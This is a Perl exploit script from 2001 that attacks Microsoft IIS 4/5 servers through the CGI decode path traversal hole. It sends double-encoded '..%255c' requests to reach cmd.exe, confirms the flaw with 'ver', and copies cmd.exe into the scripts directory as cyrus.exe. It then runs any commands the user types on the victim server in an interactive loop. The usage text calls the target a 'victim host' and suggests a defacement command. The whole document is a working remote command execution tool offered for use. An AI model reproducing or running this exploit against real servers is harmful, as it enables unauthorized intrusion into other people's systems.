#!/usr/bin/perl
# Written by Cyrus The Gerat , CyrusArmy@Bigfoot.com ,
May 15th 2001
# This perl script lets you to test the vulnerable
servers to IIS4/5 CGI decode hole,
# Also you can exploit the hole and execute your
commands remotely!
# Vulnerability found by NSfocus security team,
# Tested for compatibility on UNIX/WINDOWS
(activestate perl)
# Works well on windows and unix platforms,


$ARGC=@ARGV;
if ($ARGC <3) {
 print "\n\nRemote IIS4/5 decode hole tester! By
CyrusTheGreat ,CyrusArmy\@Bigfoot.com\n";
 print "\n Usage:\n\n $0 <victim host> <victim port>
<command line to execute>\n\n";
	print "        Victim Host: Address of IIS4/5 server
vulnerable to decode hole! \n";
      print "        Victim port: HTTP/HTTPS port 80
or 443\n";
	print "        Command to Execute: for example \"echo
Just hacked! > hacked.txt\"  \n\n";
	exit;
}
use Socket;

my
($host,$port,$target,$notvulnerable,$notfound,$notcopied,$accessdenied);
$host=$ARGV[0];
$port=$ARGV[1];
$target=inet_aton($host);
$notvulnerable=1;
$notfound=1;
$accessdenied=0;

print "\nRemote IIS4/5 decode hole tester! By
CyrusTheGreat ,CyrusArmy\@Bigfoot.com\n";
print "Connecting to server $host port $port...,
\n\n";
@results=sendraw("GET
/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver
HTTP/1.0\r\n\r\n");

for ($i=0; $i <=7 ;$i++ ) {
print $results[$i];
}


foreach $line (@results){
 if ($line =~ /\[Version/) {
 $notvulnerable=0;
 print "\nWow! system is vulnerable.\n";
 print $line;
 }
 }

if ($notvulnerable) {
 print "\nOops! System is not vulnerable. \n";
 exit(1);
} 

# you can exchange Wow! and Oops! as you prefer! ;-)

print "\nChecking for command interpreter...\n";
@results=sendraw("GET
/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir%20cyrus%2eexe
HTTP/1.0\r\n\r\n");
#print @results;

foreach $line (@results){
 if ($line =~ /cyrus.exe/) {$notfound=0;}
}

if ($notfound) { 
 print "Command interpreter not found, Trying to copy
cmd.exe \n";
 @results=sendraw("GET
/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+copy+%2e%2e%5c%2e%2e%5cwinnt%5csystem32%5ccmd%2eexe+cyrus%2eexe
HTTP/1.0\r\n\r\n");
#print @results;
 }

 foreach $line (@results){
  if (($line =~ /denied/ )) {$accessdenied=1;}
 }

 if ($accessdenied) {
 print"Cannot copy command interpreter, Try manually!
\n\n";
 exit(2);
 } else {
   print "Command interpreter OK \n";
  }

$command=@ARGV[2];
print "Now executing your command: $command \n\n";
#$command=~s/ /\%20/g;
$command =~ s/(\W)/sprintf("%%%x", ord($1))/eg;
#print $command;
my @results=sendraw("GET
/scripts/cyrus.exe?/c+$command HTTP/1.0\r\n\r\n");
print @results;

    print STDOUT "\n\nMore commands? , or EOF to
end:\n";
    while ($command = <STDIN>) {
            print "You said: $command \n";
	    chop $command;
		$command =~ s/(\W)/sprintf("%%%x", ord($1))/eg;
		my @results=sendraw("GET
/scripts/cyrus.exe?/c+$command HTTP/1.0\r\n\r\n");
		print @results;           
            print "\n\nTell me more, or EOF (^D/^Z) to
end:\n";
    }
    print "\nThat's all! Another IIS hole just
similified by cyrus!\n";

sub sendraw {   
        my ($pstr)=@_;
       
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0)
||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else {
		 print "Cannot connect to $host port $port\n";
		 exit(3); }
}

